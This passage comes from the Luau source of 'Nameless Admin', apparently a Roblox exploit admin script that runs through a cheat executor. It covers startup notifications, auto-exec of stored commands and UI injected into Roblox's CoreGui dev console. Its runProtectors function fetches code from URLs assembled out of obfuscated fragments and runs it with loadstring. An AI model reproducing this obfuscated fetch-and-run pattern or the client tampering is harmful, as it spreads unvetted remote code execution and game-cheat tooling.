SpawnCall(function()
	const NAresult = tick() - NAbegin
	const nameCheck = nameChecker(Player)

	Delay(0.3, function()
		local executorName = identifyexecutor and identifyexecutor() or "Unknown"
		local welcomeMessage = "Welcome to "..adminName..curVer

		executorName = maybeMock(executorName)
		welcomeMessage = maybeMock(welcomeMessage)

		const notifBody = welcomeMessage..
			(identifyexecutor and ("\nExecutor: "..executorName) or "")..
			"\nUpdated on: "..opt.NAupdDate..
			"\nTime Taken To Load: "..loadedResults(NAresult)

		if NAmanage.jlCfg.WelcomeNotif ~= false and not (type(NAmanage.isStartupHidden) == "function" and NAmanage.isStartupHidden() == true) then
			DoNotif(notifBody, 6, rngMsg().." "..nameCheck)
		end

		if NAmanage.jlCfg.SupportedGameNotif ~= false and not (type(NAmanage.isStartupHidden) == "function" and NAmanage.isStartupHidden() == true) then
			SpawnCall(function()
				NAmanage.NotifySupportedGameScripts()
			end)
		end

		if not FileSupport then
			--warn("NAWWW NO FILE SUPPORT???????")
			Window({
				Title = maybeMock("Would you like to enable QueueOnTeleport?"),
				Description = maybeMock("With QueueOnTeleport, "..adminName.." will automatically execute itself upon teleporting to a game or place."),
				Buttons = {
					{Text = "Yes", Callback = function()
						opt.queueteleport(opt.loader)
					end},
					{Text = "No", Callback = function() end}
				}
			})
		elseif not opt.queueteleport then
			warn('your executor is dog shit')
		end

		Wait(1)

		if IsOnPC and NAmanage.jlCfg.KeybindNotif ~= false and not (type(NAmanage.isStartupHidden) == "function" and NAmanage.isStartupHidden() == true) then
			const keybindMessage = maybeMock("Your Keybind Prefix: "..opt.prefix)
			DoNotif(keybindMessage, 10, adminName.." Keybind Prefix")
		end

		const guardFlagName = (NAmanage._guardTokens and NAmanage._guardTokens.name) or ""
		const guardFlagValue = (NAmanage._guardTokens and NAmanage._guardTokens.value) or ""

		const function guardEnv()
			const env = (_na_env and type(_na_env) == "table" and _na_env) or ((getgenv and getgenv()) or _G or {})
			return env
		end

		const function readGuardValue(keyName, primary)
			if keyName == nil then
				return nil
			end

			local value = nil
			const function take(source)
				if value ~= nil or type(source) ~= "table" then
					return
				end

				local ok, got = pcall(rawget, source, keyName)
				if ok and got ~= nil then
					value = got
					return
				end

				ok, got = pcall(function()
					return source[keyName]
				end)
				if ok and got ~= nil then
					value = got
				end
			end

			take(primary)
			take(_na_env)
			take(_na_shared)
			take(_na_boot and _na_boot.runtimeEnv)
			take(_G)
			take(_na_boot and _na_boot.hostEnv)

			return value
		end

		const function writeGuardValue(keyName, value, primary)
			if keyName == nil then
				return
			end

			const function put(target)
				if type(target) == "table" then
					pcall(function()
						target[keyName] = value
					end)
				end
			end

			put(primary)
			put(_na_env)
			put(_na_shared)
			put(_na_boot and _na_boot.runtimeEnv)
			put(_G)
			put(_na_boot and _na_boot.hostEnv)
		end

		const guardSeedKeys = {
			"NAverify",
			"NAKey",
			"__NAKeySource",
			"adminName",
			"mainName",
			"testingName",
			"NATestingVer",
			"ActivateAprilMode",
			"NA_LOADED",
			"ltseverydayyou_NA",
			"__NAServiceResolver",
		}
		if type(guardFlagName) == "string" and guardFlagName ~= "" then
			guardSeedKeys[#guardSeedKeys + 1] = guardFlagName
		end

		const function mirrorGuardState(env)
			env = (type(env) == "table" and env) or guardEnv()

			local key = readGuardValue("NAverify", env)
			if key == nil then
				key = readGuardValue("NAKey", env)
			end
			key = tostring(key or "")
			if key ~= "" then
				writeGuardValue("NAverify", key, env)
				writeGuardValue("NAKey", key, env)
				writeGuardValue("__NAKeySource", "NA testing.luau", env)
			end

			local flag = readGuardValue(guardFlagName, env)
			if flag == nil and type(guardFlagValue) == "string" and guardFlagValue ~= "" then
				flag = guardFlagValue
			end
			if flag ~= nil and type(guardFlagName) == "string" and guardFlagName ~= "" then
				writeGuardValue(guardFlagName, flag, env)
			end
		end

		const function primeGuardEnv()
			const env = guardEnv()
			const testing = readGuardValue("NATestingVer", env) == true

			local resolvedName = tostring(adminName or "")
			if resolvedName ~= "NA" and resolvedName ~= "Nameless Admin" and resolvedName ~= "NA Testing" then
				resolvedName = testing and "NA Testing" or "Nameless Admin"
			end
			if resolvedName == "" then
				resolvedName = testing and "NA Testing" or "Nameless Admin"
			end

			if type(env.adminName) ~= "string" or env.adminName == "" then
				env.adminName = resolvedName
			end
			if type(env.mainName) ~= "string" or env.mainName == "" then
				env.mainName = "Nameless Admin"
			end
			if testing then
				env.testingName = "NA Testing"
			elseif type(env.testingName) ~= "string" or env.testingName == "" then
				env.testingName = resolvedName
			end

			writeGuardValue("adminName", env.adminName, env)
			writeGuardValue("mainName", env.mainName, env)
			writeGuardValue("testingName", env.testingName, env)
			writeGuardValue("NATestingVer", testing, env)
			writeGuardValue("NA_LOADED", readGuardValue("NA_LOADED", env) or naFlagValue, env)
			writeGuardValue("ltseverydayyou_NA", readGuardValue("ltseverydayyou_NA", env) or naFlagValue, env)

			mirrorGuardState(env)
			return env
		end

		const function buildGuardSandbox(sharedEnv)
			sharedEnv = (type(sharedEnv) == "table" and sharedEnv) or guardEnv()
			const sandbox = {}
			const sandboxShared = {}

			for _, keyName in guardSeedKeys do
				const value = readGuardValue(keyName, sharedEnv)
				if value ~= nil then
					sandbox[keyName] = value
					sandboxShared[keyName] = value
				end
			end

			setmetatable(sandboxShared, {
				__index = function(_, key)
					return readGuardValue(key, sharedEnv)
				end
			})

			sandbox.shared = sandboxShared
			sandbox._G = sandbox
			sandbox.getgenv = function()
				return sandbox
			end
			sandbox.getfenv = function()
				return sandbox
			end

			setmetatable(sandbox, {
				__index = function(_, key)
					if key == "_G" then
						return sandbox
					elseif key == "shared" then
						return sandboxShared
					elseif key == "getgenv" then
						return sandbox.getgenv
					elseif key == "getfenv" then
						return sandbox.getfenv
					end
					return readGuardValue(key, sharedEnv)
				end
			})

			return sandbox
		end

		const function syncGuardSandbox(sharedEnv, sandboxEnv)
			sharedEnv = (type(sharedEnv) == "table" and sharedEnv) or guardEnv()
			if type(sandboxEnv) ~= "table" then
				mirrorGuardState(sharedEnv)
				return
			end

			const sandboxShared = rawget(sandboxEnv, "shared")
			for _, keyName in guardSeedKeys do
				local value = rawget(sandboxEnv, keyName)
				if value == nil and type(sandboxShared) == "table" then
					value = rawget(sandboxShared, keyName)
				end
				if value ~= nil then
					writeGuardValue(keyName, value, sharedEnv)
				end
			end

			mirrorGuardState(sharedEnv)
		end

		const function runProtectors(url, chunkName, env)
			local okFetch, source = pcall(function()
				return NAmanage.HttpGetOrError(url)
			end)
			if not okFetch or type(source) ~= "string" or source == "" then
				return false
			end

			local chunk, compileErr = loadstring(source, chunkName)
			if not chunk then
				return false
			end

			local execEnv = env
			if type(env) == "table" then
				execEnv = buildGuardSandbox(env)
			end

			if type(setfenv) == "function" and type(execEnv) == "table" then
				pcall(setfenv, chunk, execEnv)
			end

			local okRun, runErr = pcall(chunk)
			if not okRun then end

			if type(env) == "table" then
				syncGuardSandbox(env, execEnv)
			else
				mirrorGuardState(env)
			end
			if env and env[guardFlagName] == guardFlagValue then
				mirrorGuardState(env)
			end

			return okRun
		end

		const sharedGuardEnv = primeGuardEnv()
		const baseRoute = {
			NAmanage._la0,
			{ m = true, b = NAStuff._lb0, s = 4 },
			NAmanage._lc0,
			{ m = true, b = NAmanage._ld0, s = 6 },
			NAmanage._le0,
		}
		const coreRoute = {
			baseRoute[1],
			baseRoute[2],
			baseRoute[3],
			baseRoute[4],
			baseRoute[5],
			{ m = true, b = NAmanage._cf0, s = 10 },
			NAStuff._cf1,
			{ m = true, b = NAmanage._cf2, s = 1 },
		}
		const cmdRoute = {
			baseRoute[1],
			baseRoute[2],
			baseRoute[3],
			baseRoute[4],
			baseRoute[5],
			NAmanage._lx0,
			{ m = true, b = NAStuff._lx1, s = 8 },
			NAmanage._lx2,
		}
		const coreGuiOk = runProtectors(NAmanage._linkGlyph(coreRoute), "CoreGuiManipulation", sharedGuardEnv)
		if coreGuiOk then
			runProtectors(NAmanage._linkGlyph(cmdRoute), "lxteCmdSupport", sharedGuardEnv)
		end

		-- just ignore this section (personal stuff)
		--[[Window({
			Title = adminName.." (Archived)",
			Description = 'This version is no longer maintained.\nCheck the README on GitHub for legacy details.',
			Buttons = {
				{
					Text = "Copy GitHub Repo",
					Callback = function()
						setclipboard(NAmanage._sourceGlyph(NAStuff.officialRepoLink))
					end
				},
				{
					Text = "Discord Server",
					Callback = function()
						setclipboard("https://discord.gg/zzjYhtMGFD")
					end
				},
				{
					Text = "Close",
					Callback = function() end
				}
			}
		})]]
	end)
	SpawnCall(function()
		while NAStuff.StartupInitializersReady ~= true do
			Wait()
		end

		if NAmanage.loadAutoExec then
			pcall(NAmanage.loadAutoExec)
		end

		if NAStuff.AutoExecEnabled == false then
			DebugNotif("AutoExec is disabled, skipping stored commands.")
			return
		end

		const data = NAEXECDATA or { commands = {}, args = {} }
		const commands = data.commands

		if type(commands) ~= "table" or #commands == 0 then
			return
		end

		const perf = NAStuff and NAStuff.StartupPerformance
		const autoExecStart = os.clock()
		if type(perf) == "table" then
			perf.autoExecStarted = autoExecStart
			perf.autoExecCount = #commands
			perf.autoExecTotalElapsed = 0
			perf.autoExecMaxElapsed = 0
			perf.autoExecCommands = {}
		end
		for i = 1, #commands do
			const it = commands[i]
			local c, a

			if type(it) == "table" then
				c = it.c or it.cmd or it.command or it[1]
				a = it.a or it.args or it.arguments or it[2] or ""
			elseif type(it) == "string" then
				c = it
				a = (data.args and data.args[it]) or ""
			end

			if type(c) == "string" then
				const run = { c }
				if type(a) == "string" and a ~= "" then
					const extra = ParseArguments(a)
					if type(extra) == "table" then
						for j = 1, #extra do
							run[#run + 1] = extra[j]
						end
					end
				end
				const commandStart = os.clock()
				pcall(cmd.run, run)
				if type(perf) == "table" then
					const commandElapsed = os.clock() - commandStart
					perf.autoExecTotalElapsed = (tonumber(perf.autoExecTotalElapsed) or 0) + commandElapsed
					const commandTimings = type(perf.autoExecCommands) == "table" and perf.autoExecCommands or {}
					perf.autoExecCommands = commandTimings
					if #commandTimings < 20 then
						commandTimings[#commandTimings + 1] = {
							name = tostring(c);
							elapsed = commandElapsed;
							index = i;
						}
					end
					if commandElapsed > (tonumber(perf.autoExecMaxElapsed) or 0) then
						perf.autoExecMaxElapsed = commandElapsed
						perf.autoExecMaxCommand = tostring(c)
					end
					perf.autoExecLastIndex = i
				end
			end
		end
		if type(perf) == "table" then
			perf.autoExecElapsed = os.clock() - autoExecStart
		end
	end)
	if NAmanage.IsLegacyCommandUI and NAmanage.IsLegacyCommandUI() then
		NAUIMANAGER.cmdInput.ZIndex = 2
		if predictionInput then
			predictionInput.ZIndex = 3
		end
	else
		NAUIMANAGER.cmdInput.ZIndex = math.max(tonumber(NAUIMANAGER.cmdInput.ZIndex) or 0, 23)
		if predictionInput then
			predictionInput.ZIndex = math.max(1, NAUIMANAGER.cmdInput.ZIndex - 1)
		end
	end
	NAUIMANAGER.cmdInput.PlaceholderText = isAprilFools() and '🤡 '..adminName..curVer..' 🤡' or NAmanage.getSeasonEmoji()..' '..adminName..curVer..' '..NAmanage.getSeasonEmoji()
	NAmanage.startAprilPranks()
end)

math.randomseed(os.time())

NAmanage.cleanupRobloxDevConsoleCopyButtons = function()
	if NAStuff and NAStuff._rbxDevConsoleCopyCleanup then
		pcall(NAStuff._rbxDevConsoleCopyCleanup)
		NAStuff._rbxDevConsoleCopyCleanup = nil
	end
	if NAStuff then
		NAStuff._rbxDevConsoleCopyTarget = nil
		NAStuff._rbxDevConsoleCopyRefresh = nil
	end
end

NAmanage.getRobloxDevConsoleWindow = function()
	const coreGui = Services.CoreGui
	if not coreGui then
		return nil
	end
	local state = NAmanage._rbxDevConsoleLookup
	if type(state) ~= "table" then
		state = {}
		NAmanage._rbxDevConsoleLookup = state
	end
	local window = state.window
	if window and window.Parent and window.Name == "DevConsoleWindow" then
		return window
	end
	state.window = nil

	local master = state.master
	if not (master and master.Parent and master.Name == "DevConsoleMaster") then
		master = coreGui:FindFirstChild("DevConsoleMaster")
		state.master = master
	end
	if not master then
		return nil
	end
	window = master:FindFirstChild("DevConsoleWindow")
	state.window = window
	return window
end

NAmanage.getRobloxDevConsoleClientLog = function(window, deep)
	const consoleUI = window and (window:FindFirstChild("DevConsoleUI") or window)
	const mainView = consoleUI and consoleUI:FindFirstChild("MainView")
	if not mainView then
		return nil
	end
	const clientLog = mainView:FindFirstChild("ClientLog")
	if clientLog or deep == false then
		return clientLog
	end
	return mainView:FindFirstChild("ClientLog", true)
end

NAmanage.bindRobloxDevConsoleCopyButtons = function(window, forceScan)
	if NAStuff and NAStuff.RobloxDevConsoleCopyButtonsEnabled == false then
		NAmanage.cleanupRobloxDevConsoleCopyButtons()
		return false
	end
	if not setclipboard then
		NAmanage.cleanupRobloxDevConsoleCopyButtons()
		return false
	end

	const clientLog = NAmanage.getRobloxDevConsoleClientLog and NAmanage.getRobloxDevConsoleClientLog(window, true) or nil
	if not clientLog then
		if NAStuff._rbxDevConsoleCopyCleanup and NAStuff._rbxDevConsoleCopyTarget and not NAStuff._rbxDevConsoleCopyTarget.Parent then
			NAmanage.cleanupRobloxDevConsoleCopyButtons()
		end
		return false
	end

	if NAStuff._rbxDevConsoleCopyTarget == clientLog and NAStuff._rbxDevConsoleCopyRefresh then
		pcall(NAStuff._rbxDevConsoleCopyRefresh, forceScan == true)
		return true
	end

	if NAStuff._rbxDevConsoleCopyCleanup then
		NAmanage.cleanupRobloxDevConsoleCopyButtons()
	end

	const connections = {}
	const createdButtons = {}
	local boundHosts = setmetatable({}, { __mode = "k" })
	local buttonHosts = setmetatable({}, { __mode = "k" })
	local attachCount = 0
	local lastScan = 0
	local scanQueued = false
	local pendingForceScan = false
	local maxButtons = math.floor(tonumber(NAStuff and NAStuff.RobloxDevConsoleCopyLimit) or 180)
	if maxButtons < 40 then
		maxButtons = 40
	elseif maxButtons > 400 then
		maxButtons = 400
	end

	const function setMark(inst, key, value)
		if not inst then
			return
		end
		if NAmanage.SetAttr then
			pcall(NAmanage.SetAttr, inst, key, value)
		else
			pcall(function()
				inst:SetAttribute(key, value)
			end)
		end
	end

	const function getMark(inst, key)
		if not inst then
			return nil
		end
		if NAmanage.GetAttr then
			local ok, value = pcall(NAmanage.GetAttr, inst, key)
			if ok then
				return value
			end
		end
		local ok, value = pcall(function()
			return inst:GetAttribute(key)
		end)
		return ok and value or nil
	end

	const function isDescendantOf(node, ancestor)
		local current = node
		while current do
			if current == ancestor then
				return true
			end
			current = current.Parent
		end
		return false
	end

	const function resolveHost(label)
		local host = label and label.Parent or nil
		if not (host and host:IsA("GuiObject")) or host == clientLog then
			host = label
		end
		return host
	end

	const function sanitizeConsoleCopyText(parts, fallback)
		const out = {}
		for i = 1, #(parts or {}) do
			const text = tostring(parts[i] or ""):match("^%s*(.-)%s*$")
			if text ~= "" and text ~= "COPY" and text ~= "DONE" then
				Insert(out, text)
			end
		end
		if #out >= 1 and out[1]:match("^%d%d:%d%d:%d%d$") then
			table.remove(out, 1)
		end
		if #out >= 1 and out[1] == "--" then
			table.remove(out, 1)
		end
		const text = (#out > 0 and Concat(out, " ") or tostring(fallback or "")):gsub("^%s*%d%d:%d%d:%d%d%s*%-%-%s*", "")
		return text:match("^%s*(.-)%s*$")
	end

	const function collectCopyText(label)
		const host = resolveHost(label)
		if not host then
			return ""
		end
		const labels = {}
		const list = NAmanage.QueryDescendants(host, "TextLabel")
		for i = 1, #list do
			const desc = list[i]
			const text = tostring(desc.Text or ""):match("^%s*(.-)%s*$")
			if text ~= "" then
				Insert(labels, desc)
			end
		end
		if #labels == 0 then
			return sanitizeConsoleCopyText(nil, label.Text or "")
		end
		table.sort(labels, function(a, b)
			const ay, by = a.AbsolutePosition.Y, b.AbsolutePosition.Y
			if math.abs(ay - by) > 1 then
				return ay < by
			end
			const ax, bx = a.AbsolutePosition.X, b.AbsolutePosition.X
			if math.abs(ax - bx) > 1 then
				return ax < bx
			end
			return (a.LayoutOrder or 0) < (b.LayoutOrder or 0)
		end)
		const parts = {}
		for i = 1, #labels do
			const text = tostring(labels[i].Text or ""):match("^%s*(.-)%s*$")
			if text ~= "" then
				Insert(parts, text)
			end
		end
		return sanitizeConsoleCopyText(parts, label.Text or "")
	end

	const function removeButtonAt(index)
		const button = createdButtons[index]
		if not button then
			table.remove(createdButtons, index)
			return
		end
		const host = buttonHosts[button]
		if host then
			setMark(host, "NA_RBXDevConsoleCopyBound", nil)
			boundHosts[host] = nil
		end
		buttonHosts[button] = nil
		pcall(function()
			if button.Parent then
				button:Destroy()
			end
		end)
		table.remove(createdButtons, index)
	end

	const function pruneButtons()
		for i = #createdButtons, 1, -1 do
			const button = createdButtons[i]
			if not (button and button.Parent) then
				removeButtonAt(i)
			end
		end
		while #createdButtons > maxButtons do
			removeButtonAt(1)
		end
	end

	const function attach(label)
		if not (label and label.Parent and label:IsA("TextLabel")) then
			return
		end
		if not isDescendantOf(label, clientLog) then
			return
		end
		const text = tostring(label.Text or "")
		if text:match("^%s*$") then
			return
		end

		const host = resolveHost(label)
		if not (host and host.Parent) then
			return
		end
		if getMark(host, "NA_RBXDevConsoleCopyBound") == true then
			return
		end
		if #createdButtons >= maxButtons then
			pruneButtons()
			if #createdButtons >= maxButtons then
				removeButtonAt(1)
			end
		end

		const copyButton = InstanceNew("TextButton")
		copyButton.Name = "NADevConsoleCopyButton"
		copyButton.Text = "COPY"
		copyButton.Font = Enum.Font.GothamSemibold
		copyButton.TextSize = 10
		copyButton.TextColor3 = Color3.fromRGB(240, 244, 247)
		copyButton.BackgroundColor3 = Color3.fromRGB(20, 24, 29)
		copyButton.BackgroundTransparency = 0.12
		copyButton.BorderSizePixel = 0
		copyButton.AutoButtonColor = true
		copyButton.AnchorPoint = Vector2.new(1, 0.5)
		copyButton.Position = UDim2.new(1, -8, 0.5, 0)
		copyButton.Size = UDim2.new(0, 38, 0, 16)
		copyButton.ZIndex = math.max((host.ZIndex or 1) + 2, (label.ZIndex or 1) + 2)
		copyButton.AutoLocalize = false
		copyButton.Parent = host

		const corner = InstanceNew("UICorner")
		corner.CornerRadius = UDim.new(0, 6)
		corner.Parent = copyButton

		const stroke = InstanceNew("UIStroke")
		stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
		stroke.Color = Color3.fromRGB(132, 145, 160)
		stroke.Transparency = 0.45
		stroke.Thickness = 1
		stroke.Parent = copyButton

		const clickConn = MouseButtonFix(copyButton, function()
			const copyText = collectCopyText(label)
			if copyText == "" then
				return
			end
			const ok = pcall(setclipboard, copyText)
			if ok then
				copyButton.Text = "DONE"
				Delay(0.7, function()
					if copyButton and copyButton.Parent then
						copyButton.Text = "COPY"
					end
				end)
				DoNotif("Console line copied to clipboard.", 1.5)
			else
				DoNotif("Clipboard unavailable", 1.5)
			end
		end)
		if clickConn then
			Insert(connections, clickConn)
		end
		Insert(createdButtons, copyButton)
		buttonHosts[copyButton] = host
		boundHosts[host] = true
		setMark(host, "NA_RBXDevConsoleCopyBound", true)
		attachCount += 1
		if attachCount % 32 == 0 then
			pruneButtons()
		end
	end

	const function scan(root, force)
		if not (root and root.Parent) then
			return
		end
		const now = tick()
		if force ~= true and now - lastScan < 5 then
			return
		end
		lastScan = now
		pruneButtons()
		const maxLabels = math.max(maxButtons * 3, 300)
		const maxNodes = math.max(maxLabels * 8, 800)
		const q = { root }
		local qi, qn = 1, 1
		local visited, matched = 0, 0
		while qi <= qn and visited < maxNodes and matched < maxLabels do
			const inst = q[qi]
			q[qi] = nil
			qi += 1
			if inst and (inst == root or inst.Parent) then
				visited += 1
				if inst ~= root and inst:IsA("TextLabel") then
					matched += 1
					attach(inst)
				end
				local okChildren, children = pcall(inst.GetChildren, inst)
				if okChildren and type(children) == "table" then
					for i = 1, #children do
						qn += 1
						q[qn] = children[i]
					end
				end
			end
			if visited > 0 and visited % 90 == 0 then
				Wait()
			end
		end
		pruneButtons()
	end

	const function queueScan(force, delayTime)
		if force == true then
			pendingForceScan = true
		end
		if scanQueued then
			return
		end
		scanQueued = true
		const function runScan()
			scanQueued = false
			if NAStuff and NAStuff._rbxDevConsoleCopyTarget == clientLog then
				const runForce = pendingForceScan == true or force == true
				pendingForceScan = false
				scan(clientLog, runForce)
			end
		end
		delayTime = tonumber(delayTime) or 0
		if delayTime > 0 then
			Delay(delayTime, runScan)
		else
			Defer(runScan)
		end
	end

	queueScan(true, 0.05)
	Insert(connections, NAmanage.descAdd(clientLog, function(desc)
		attach(desc)
	end, function(desc)
		return desc and desc:IsA("TextLabel")
	end))
	Insert(connections, clientLog.AncestryChanged:Connect(function(_, parent)
		if not parent and NAStuff._rbxDevConsoleCopyCleanup then
			pcall(NAStuff._rbxDevConsoleCopyCleanup)
			NAStuff._rbxDevConsoleCopyCleanup = nil
			NAStuff._rbxDevConsoleCopyTarget = nil
			NAStuff._rbxDevConsoleCopyRefresh = nil
		end
	end))

	const function cleanup()
		for host in boundHosts do
			if host then
				setMark(host, "NA_RBXDevConsoleCopyBound", nil)
			end
		end
		boundHosts = setmetatable({}, { __mode = "k" })
		buttonHosts = setmetatable({}, { __mode = "k" })
		for i = #createdButtons, 1, -1 do
			const button = createdButtons[i]
			if button then
				pcall(function()
					if button.Parent then
						button:Destroy()
					end
				end)
			end
			createdButtons[i] = nil
		end
		for i = #connections, 1, -1 do
			const conn = connections[i]
			if conn and conn.Disconnect then
				pcall(function()
					conn:Disconnect()
				end)
			end
			connections[i] = nil
		end
		scanQueued = false
	end

	NAStuff._rbxDevConsoleCopyTarget = clientLog
	NAStuff._rbxDevConsoleCopyRefresh = function(force)
		if force == true then
			queueScan(true, 0)
		elseif tick() - lastScan >= 20 then
			queueScan(false, 0.1)
		elseif #createdButtons > maxButtons then
			pruneButtons()
		end
	end
	NAStuff._rbxDevConsoleCopyCleanup = cleanup
	return true
end

NAmanage.refreshDevConsoleFeatures = function()
	const window = NAmanage.getRobloxDevConsoleWindow and NAmanage.getRobloxDevConsoleWindow() or nil
	const windowVisible = window and window.Visible ~= false

	if NAStuff and NAStuff.NAConsoleMasterEnabled == true then
		SpawnCall(NAmanage.injectNAConsole)
	else
		if NAmanage._naConsoleFrame or NAmanage._naConsoleInitialized then
			NAmanage.destroyNAConsole()
		end
	end

	if NAStuff and NAStuff.RobloxDevConsoleCopyButtonsEnabled == true then
		NAmanage.ensureRobloxDevConsoleCopyLoop()
	else
		NAlib.disconnect("rbx_devconsole_copy_loop")
	end

	if NAStuff and NAStuff.RobloxDevConsoleCopyButtonsEnabled == true and windowVisible then
		NAmanage.bindRobloxDevConsoleCopyButtons(window)
	else
		NAmanage.cleanupRobloxDevConsoleCopyButtons()
	end
end

NAmanage.ensureRobloxDevConsoleCopyLoop = function()
	if not (NAStuff and NAStuff.RobloxDevConsoleCopyButtonsEnabled == true) then
		NAmanage.cleanupRobloxDevConsoleCopyButtons()
		return
	end
	if NAStuff.NAConsoleMasterEnabled ~= false then
		NAlib.disconnect("rbx_devconsole_copy_loop")
		return
	end
	if NAlib.isConnected and NAlib.isConnected("rbx_devconsole_copy_loop") then
		return
	end

	local elapsed = 1
	local lastVisible = false
	NAlib.connect("rbx_devconsole_copy_loop", Services.RunService.Heartbeat:Connect(function(dt)
		elapsed = elapsed + (dt or 0)
		const interval = lastVisible and 1.25 or 4
		if elapsed < interval then
			return
		end
		elapsed = 0

		if not (NAStuff and NAStuff.RobloxDevConsoleCopyButtonsEnabled == true) then
			NAlib.disconnect("rbx_devconsole_copy_loop")
			NAmanage.cleanupRobloxDevConsoleCopyButtons()
			return
		end

		const window = NAmanage.getRobloxDevConsoleWindow and NAmanage.getRobloxDevConsoleWindow() or nil
		lastVisible = window and window.Visible ~= false or false
		if lastVisible then
			NAmanage.bindRobloxDevConsoleCopyButtons(window, false)
		elseif NAStuff._rbxDevConsoleCopyTarget and not NAStuff._rbxDevConsoleCopyTarget.Parent then
			NAmanage.cleanupRobloxDevConsoleCopyButtons()
		end
	end))
end

NAmanage.injectNAConsole = function()
	if NAStuff and NAStuff.NAConsoleMasterEnabled == false then
		const window = NAmanage.getRobloxDevConsoleWindow and NAmanage.getRobloxDevConsoleWindow() or nil
		if NAStuff.RobloxDevConsoleCopyButtonsEnabled == true and window and window.Visible ~= false then
			NAmanage.bindRobloxDevConsoleCopyButtons(window)
		else
			NAmanage.cleanupRobloxDevConsoleCopyButtons()
		end
		return true
	end
	if NAmanage._naConsoleInitialized then
		return true
	end

	local baseMainViewSize = nil
	local lastWindowSize = nil
	local cachedCoreGui = nil
	local cachedConsoleMaster = nil
	local cachedConsoleWindow = nil
	local lastCopyBindWindow = nil
	local ensureQueued = false
	local consoleVisible = false
	local ensureInjection
	local resetCommandLine
	local commandLine

	const function queueConsoleEnsure(delayTime)
		if ensureQueued then
			return
		end
		ensureQueued = true
		const function runEnsure()
			ensureQueued = false
			if NAmanage._naConsoleFrame and NAmanage._naConsoleFrame ~= commandLine then
				return
			end
			if not NAmanage._naConsoleFrame and NAmanage._naConsoleInitialized == false and not commandLine.Parent then
				return
			end
			if ensureInjection then
				consoleVisible = ensureInjection() == true
			end
		end
		delayTime = tonumber(delayTime) or 0
		if delayTime > 0 then
			Delay(delayTime, runEnsure)
		else
			Defer(runEnsure)
		end
	end

	const function watchConsoleWindow(window)
		if cachedConsoleWindow == window then
			return
		end
		NAlib.disconnect("naconsole_window_visible")
		NAlib.disconnect("naconsole_window_ancestry")
		cachedConsoleWindow = window
		if not window then
			return
		end
		NAlib.connect("naconsole_window_visible", window:GetPropertyChangedSignal("Visible"):Connect(function()
			queueConsoleEnsure(0.05)
		end))
		NAlib.connect("naconsole_window_ancestry", window.AncestryChanged:Connect(function(_, parent)
			if not parent then
				cachedConsoleWindow = nil
				lastCopyBindWindow = nil
				resetCommandLine()
				NAmanage.cleanupRobloxDevConsoleCopyButtons()
				queueConsoleEnsure(1)
			end
		end))
	end

	const function watchConsoleMaster(master)
		if cachedConsoleMaster == master then
			return
		end
		NAlib.disconnect("naconsole_master_child")
		NAlib.disconnect("naconsole_master_ancestry")
		cachedConsoleMaster = master
		if not master then
			return
		end
		NAlib.connect("naconsole_master_child", master.ChildAdded:Connect(function(child)
			if child and child.Name == "DevConsoleWindow" then
				const state = NAmanage._rbxDevConsoleLookup
				if type(state) == "table" then
					state.master = master
					state.window = child
				end
				watchConsoleWindow(child)
				queueConsoleEnsure(0.05)
			end
		end))
		NAlib.connect("naconsole_master_ancestry", master.AncestryChanged:Connect(function(_, parent)
			if not parent then
				cachedConsoleMaster = nil
				cachedConsoleWindow = nil
				lastCopyBindWindow = nil
				resetCommandLine()
				NAmanage.cleanupRobloxDevConsoleCopyButtons()
				queueConsoleEnsure(1.5)
			end
		end))
	end

	const function watchConsoleRoot(coreGui)
		if cachedCoreGui == coreGui then
			return
		end
		NAlib.disconnect("naconsole_coregui_child")
		cachedCoreGui = coreGui
		if not coreGui then
			return
		end
		NAlib.connect("naconsole_coregui_child", coreGui.ChildAdded:Connect(function(child)
			if child and child.Name == "DevConsoleMaster" then
				const state = NAmanage._rbxDevConsoleLookup
				if type(state) == "table" then
					state.master = child
					state.window = nil
				end
				watchConsoleMaster(child)
				queueConsoleEnsure(0.05)
			end
		end))
	end

	const function ensureCommandHelpers()
		if not NAmanage._naConsoleDispatch then
			const function splitArgs(line)
				local out, buf, quote = {}, "", nil
				for i = 1, #line do
					const ch = Sub(line, i, i)
					if quote then
						if ch == quote then
							quote = nil
						else
							buf = buf..ch
						end
					else
						if ch == "'" or ch == '"' then
							quote = ch
						elseif ch == " " or ch == "\t" then
							if #buf > 0 then
								out[#out+1] = buf
								buf = ""
							end
						else
							buf = buf..ch
						end
					end
				end
				if #buf > 0 then
					out[#out+1] = buf
				end
				return out
			end

			const function dispatchRun(...)
				const runner = cmd and (cmd.run or cmd.Run)
				if not runner then
					return nil, "cmd.run not available"
				end

				const n = select("#", ...)
				local argv
				if n == 1 then
					const a = ...
					if type(a) == "table" then
						argv = a
					elseif type(a) == "string" then
						argv = splitArgs(a)
					else
						return nil, "invalid input to cmdRun"
					end
				else
					argv = {}
					for i = 1, n do
						const v = select(i, ...)
						argv[#argv+1] = type(v) == "string" and v or tostring(v)
					end
				end

				if #argv == 0 then
					return nil, "no command provided"
				end

				local ok1, res1 = NACaller(runner, argv)
				if ok1 then
					return res1
				end

				local ok2, res2 = NACaller(runner, Concat(argv, " "))
				if ok2 then
					return res2
				end

				return nil, res2
			end

			NAmanage._naConsoleDispatch = dispatchRun
		end

		const dispatch = NAmanage._naConsoleDispatch
		_na_env.cmdRun = dispatch
		_na_env.RunCommand = dispatch
		_na_env.runCommand = dispatch
	end

	commandLine = InstanceNew("Frame")
	commandLine.Name = "NAConsole"
	commandLine.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
	commandLine.BorderColor3 = Color3.fromRGB(184, 184, 184)
	commandLine.AnchorPoint = Vector2.new(0, 1)
	commandLine.Position = UDim2.new(0, 0, 1, 0)
	commandLine.Size = UDim2.new(1, 0, 0, 30)
	commandLine.ZIndex = 1
	commandLine.AutoLocalize = false

	const inputField = InstanceNew("Frame", commandLine)
	inputField.Name = "InputField"
	inputField.BackgroundTransparency = 1
	inputField.ClipsDescendants = true
	inputField.Position = UDim2.new(0, 30, 0, 0)
	inputField.Size = UDim2.new(1, -30, 0, 30)
	inputField.AutoLocalize = false
	inputField.ZIndex = 1

	const textbox = InstanceNew("TextBox", inputField)
	textbox.Name = "TextBox"
	textbox.BackgroundTransparency = 1
	textbox.ClearTextOnFocus = false
	textbox.Font = Enum.Font.Code
	textbox.PlaceholderText = "NA Console Master"
	textbox.Size = UDim2.new(1, 0, 1, 0)
	textbox.Text = ""
	textbox.TextColor3 = Color3.fromRGB(255, 255, 255)
	textbox.TextSize = 15
	textbox.TextXAlignment = Enum.TextXAlignment.Left
